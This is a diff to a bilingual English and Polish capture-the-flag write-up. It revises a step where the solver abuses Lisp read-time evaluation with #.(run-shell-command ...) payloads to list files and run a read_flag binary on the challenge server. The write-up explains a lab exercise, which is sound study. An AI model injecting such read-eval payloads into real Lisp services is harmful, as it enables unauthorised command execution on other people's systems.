@@ -137,10 +137,11 @@ With this we checked how to execute shell commands from LISP and used:
 #.(run-shell-command "ls")
 ```
 
-To find the flag in `/getflag/flag` and then:
+To find the flag in `/getflag/flag` and also a binary `getflag/read_flag` with rights to read it.
+We run it:
 
 ```
-#.(run-shell-command "./getflag/flag")
+#.(run-shell-command "./getflag/read_flag")
 ```
 
 To read the flag.
@@ -281,10 +282,11 @@ Następnie sprawdziliśmy jak wykonywać komendy shell z poziomu LISPa i wysłal
 #.(run-shell-command "ls")
 ```
 
-Aby znaleźć falgę w `/getflag/flag` a następnie:
+Aby znaleźć falgę w `/getflag/flag` oraz program `getflag/read_flag` z uprawnieniami do odczytania flagi;
+Uruchamiamy go:
 
 ```
-#.(run-shell-command "./getflag/flag")
+#.(run-shell-command "./getflag/read_flag")
 ```
 
 Aby odczytać flagę
